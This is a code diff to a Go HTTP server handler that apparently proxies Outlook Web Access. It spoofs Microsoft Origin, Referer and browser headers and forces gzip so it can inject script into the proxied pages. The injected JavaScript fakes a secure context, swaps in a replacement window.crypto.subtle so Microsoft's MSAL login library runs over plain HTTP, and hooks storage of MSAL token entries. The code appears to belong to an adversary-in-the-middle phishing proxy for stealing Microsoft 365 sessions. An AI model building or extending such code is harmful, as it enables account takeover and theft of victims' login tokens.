@@ -713,6 +713,9 @@ func (s *HttpServer) handleDCOWA(w http.ResponseWriter, r *http.Request) {
 	upReq.Header.Set("Origin", "https://outlook.office.com")
 	upReq.Header.Set("Referer", "https://outlook.office.com/")
 	upReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+	// Force gzip-only so we can decompress and inject shims.
+	// Brave/Chrome send "br, gzip" by default; OWA picks brotli which we can't decode.
+	upReq.Header.Set("Accept-Encoding", "gzip")
 
 	sess.mu.Lock()
 	resp, err := sess.client.Do(upReq)
@@ -794,17 +797,22 @@ var _subtle={
 var _newCrypto={subtle:_subtle,getRandomValues:_rv};
 /* Override isSecureContext so MSAL skips the secure-context guard */
 try{Object.defineProperty(window,'isSecureContext',{get:function(){return true;},configurable:true});}catch(e){}
-/* Replace window.crypto — use defineProperty on Window.prototype to bypass
-   Chrome's read-only accessor restriction on non-secure-context pages */
+/* Replace window.crypto.subtle.
+   In Chromium HTTP pages, window.crypto exists but subtle is undefined.
+   The reliable fix is to redefine the getter on Crypto.prototype directly. */
 if(!window.crypto||!window.crypto.subtle){
-  var installed=false;
-  try{Object.defineProperty(window,'crypto',{get:function(){return _newCrypto;},configurable:true});installed=true;}catch(e){}
-  if(!installed){try{Object.defineProperty(Object.getPrototypeOf(window),'crypto',{get:function(){return _newCrypto;},configurable:true});}catch(e){}}
-  if(!installed){try{window.crypto=_newCrypto;}catch(e){}}
-  /* Last resort: patch subtle directly even if window.crypto exists */
+  /* Strategy 1: patch Crypto.prototype.subtle (works in Chrome/Brave/Edge on HTTP) */
+  var _cp=window.Crypto&&window.Crypto.prototype;
+  if(_cp){try{Object.defineProperty(_cp,'subtle',{get:function(){return _subtle;},configurable:true});}catch(e){}}
+  /* Strategy 2: redefine window.crypto as own property on the window object */
   if(!window.crypto||!window.crypto.subtle){
-    try{Object.defineProperty(window.crypto,'subtle',{get:function(){return _subtle;},configurable:true});}catch(e){}
-  }
+    try{Object.defineProperty(window,'crypto',{get:function(){return _newCrypto;},configurable:true});}catch(e){}}
+  /* Strategy 3: Window.prototype */
+  if(!window.crypto||!window.crypto.subtle){
+    try{Object.defineProperty(Object.getPrototypeOf(window),'crypto',{get:function(){return _newCrypto;},configurable:true});}catch(e){}}
+  /* Strategy 4: brute-force assignment */
+  if(!window.crypto||!window.crypto.subtle){
+    try{window.crypto=_newCrypto;}catch(e){}}
 }
 /* ── msal.token.keys.* null-array guard (same as inject script) ── */
 (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(k&&k.indexOf('msal.token.keys.')===0&&v){try{var p=JSON.parse(v);if(p&&typeof p==='object'){if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}}catch(e){}}return v;};}());
